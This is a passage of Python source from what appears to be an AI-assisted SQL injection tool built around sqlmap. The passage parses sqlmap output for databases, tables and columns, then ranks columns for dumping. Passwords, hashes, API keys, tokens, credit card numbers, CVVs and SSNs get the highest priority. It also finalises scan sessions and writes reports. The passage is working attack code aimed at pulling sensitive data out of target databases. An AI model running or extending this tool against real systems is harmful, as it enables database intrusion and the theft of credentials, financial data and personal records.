            'parameter is vulnerable', 'injection point detected',
            'sqlmap identified', 'back-end dbms', 'is vulnerable',
            'place detected', 'parameter .* is vulnerable'
        ]
        return any(re.search(indicator, log_text) for indicator in injection_indicators)
    
    def _extract_techniques(self, logs: List[str]):
        # Extract techniques from logs 
        for line in logs:
            if 'technique' in line.lower():
                self.results['techniques'].append(line.strip())
    
    def _identify_high_value_targets(self) -> List[Dict]:
        # Identify high-value columns for dumping 
        targets = []
        high_value_keywords = [
            ('password', 'credentials'), ('passwd', 'credentials'), ('pass', 'credentials'),
            ('pwd', 'credentials'), ('hash', 'credentials'), ('salt', 'credentials'),
            ('email', 'personal'), ('mail', 'personal'), ('user', 'personal'),
            ('admin', 'admin'), ('root', 'admin'), ('token', 'security'),
            ('api_key', 'security'), ('secret', 'security'), ('credit', 'financial'),
            ('card', 'financial'), ('cvv', 'financial'), ('ssn', 'personal')
        ]
        
        for key, columns in self.results.get('columns', {}).items():
            parts = key.split('.', 1)
            if len(parts) == 2:
                db, table = parts
                for col in columns:
                    col_name = col['name'].lower()
                    for keyword, category in high_value_keywords:
                        if keyword in col_name:
                            targets.append({
                                'db': db,
                                'table': table,
                                'column': col['name'],
                                'category': category,
                                'priority': self._calculate_target_priority(col_name, category)
                            })
                            break
        
        # Sort by priority
        targets.sort(key=lambda x: x['priority'], reverse=True)
        return targets
    
    def _calculate_target_priority(self, col_name: str, category: str) -> int:
        # Calculate priority score for a target column  
        priority = 0
        
        # Category weights
        category_weights = {
            'credentials': 100,
            'security': 90,
            'financial': 80,
            'admin': 70,
            'personal': 50
        }
        priority += category_weights.get(category, 0)
        
        # Column name bonuses
        if 'password' in col_name or 'passwd' in col_name:
            priority += 50
        if 'admin' in col_name:
            priority += 30
        if 'root' in col_name:
            priority += 25
        
        return priority
    
    # ============ PARSING METHODS ============
    
    def _parse_databases_from_logs(self, logs: List[str]) -> List[str]:
        #Parse databases from sqlmap output 
        dbs = []
        in_db_section = False
        expected_count = None
        
        for line in logs:
            line_stripped = line.strip()
            
            if 'available databases' in line_stripped.lower():
                in_db_section = True
                match = re.search(r'available databases \[(\d+)\]', line_stripped.lower())
                if match:
                    expected_count = int(match.group(1))
                continue
            
            if in_db_section and expected_count:
                if line_stripped.startswith('[*]'):
                    db_name = line_stripped.replace('[*]', '').strip()
                    if db_name and len(db_name) < 100 and ' ' not in db_name and '.' not in db_name:
                        if db_name not in dbs:
                            dbs.append(db_name)
                
                if len(dbs) >= expected_count:
                    break
        
        return dbs
    
    def _parse_tables_from_logs(self, logs: List[str], db: str) -> List[str]:
        #Parse tables from sqlmap output 
        tables = []
        in_table_section = False
        
        for line in logs:
            line_stripped = line.strip()
            
            if f'database: {db}'.lower() in line_stripped.lower():
                in_table_section = True
                continue
            
            if in_table_section:
                if line_stripped.startswith('[') and 'tables' in line_stripped.lower():
                    continue
                if line_stripped.startswith('+') and line_stripped.endswith('+'):
                    continue
                
                if line_stripped.startswith('|') and line_stripped.endswith('|'):
                    if '+' in line_stripped:
                        continue
                    parts = [p.strip() for p in line_stripped.split('|') if p.strip()]
                    if parts:
                        table_name = parts[0]
                        if table_name and table_name.lower() != 'table':
                            if table_name not in tables and len(table_name) > 0:
                                tables.append(table_name)
                
                if len(line_stripped) == 0 and len(tables) > 0:
                    in_table_section = False
                elif 'database:' in line_stripped.lower() and f'database: {db}'.lower() not in line_stripped.lower():
                    in_table_section = False
        
        return tables
    
    def _parse_columns_from_logs(self, logs: List[str]) -> List[Dict]:
        #Parse columns from sqlmap output 
        columns = []
        in_column_section = False
        
        for line in logs:
            line_stripped = line.strip()
            
            if 'column' in line_stripped.lower() and ('[' in line_stripped and ']' in line_stripped):
                in_column_section = True
                continue
            
            if in_column_section:
                if line_stripped.startswith('+') and line_stripped.endswith('+'):
                    continue
                if 'column' in line_stripped.lower() and 'type' in line_stripped.lower():
                    continue
                
                if line_stripped.startswith('|') and line_stripped.endswith('|'):
                    if '+' in line_stripped:
                        continue
                    parts = [p.strip() for p in line_stripped.split('|') if p.strip()]
                    if len(parts) >= 2:
                        col_name = parts[0]
                        col_type = parts[1]
                        if col_name and col_name.lower() != 'column':
                            columns.append({'name': col_name, 'type': col_type})
                    elif len(parts) == 1:
                        col_name = parts[0]
                        if col_name and col_name.lower() != 'column':
                            columns.append({'name': col_name, 'type': 'UNKNOWN'})
                
                if len(line_stripped) == 0 and len(columns) > 0:
                    in_column_section = False
        
        return columns
    
    # ============ SESSION FINALIZATION ============
    
    async def _finalize_session(self):
        #Finalize session and generate reports
        duration = time.time() - self.session_start_time if self.session_start_time else 0
        
        # Determine Finally status
        if self.results['columns']:
            status = 'SUCCESS'
        elif self.results['databases']:
            status = 'PARTIAL'
        elif self.results['injection_found']:
            status = 'INJECTION_ONLY'
        else:
            status = 'FAILED'
        
        self.results['status'] = status
        self.results['duration'] = f"{duration:.1f}s"
        
        session_data = {
            'id': self.session_id,
            'target': self.target_url,
            'status': status,
            'dbs': len(self.results['databases']),
            'tables': sum(len(t) for t in self.results['tables'].values()),
            'columns': sum(len(c) for c in self.results['columns'].values()),
            'dumps': 0,
            'techniques': self.results['techniques'],
            'waf_detected': self.results['waf_detected'],
            'cycles': self.results['cycles'],
            'duration': f"{duration:.1f}s",
            'method': self.context.method if self.context else 'GET',
            'post_data': self.context.post_data if self.context else '',
            'headers': self.context.headers if self.context else '',
            'web_searches': self.web_searches,
            'permission_errors': len(self.results['permission_errors']),
            'ai_recommendations': len(self.results['ai_recommendations']),
            'retry_attempts': self.context.retry_count if self.context else 0
        }
        
        self.rag.log_session(session_data)
        state.current_session = None
        
        # Generate reports
        await self.broadcast("terminal", {
            "level": "info",
            "line": "\n[*] Generating reports..."
        })
        
        try:
            report_paths = report_generator.generate_all_reports(
                results=self.results,
                session_id=self.session_id,
                target_url=self.target_url,
                commands_executed=self.results['commands_executed']
            )
            
            await self.broadcast("terminal", {
                "level": "success",
                "line": f"[+] Reports saved: JSON, TXT, HTML"
            })
            
            self.results['report_files'] = report_paths
            
        except:
            pass 
            # logger.error("RUNNER", f"Report generation error: {e}")
        
        await self.broadcast("terminal", {
            "level": "info",
            "line": f"\n[SESSION END] {self.session_id} | Duration: {duration:.1f}s | Status: {status}"
        })
        
        await self.broadcast("complete", {})
    
    async def stop(self):
        #Stop the current scan 
        self.running = False
        logger.info("RUNNER", "Stop requested")


 
sqlmap_runner = SQLMapRunner()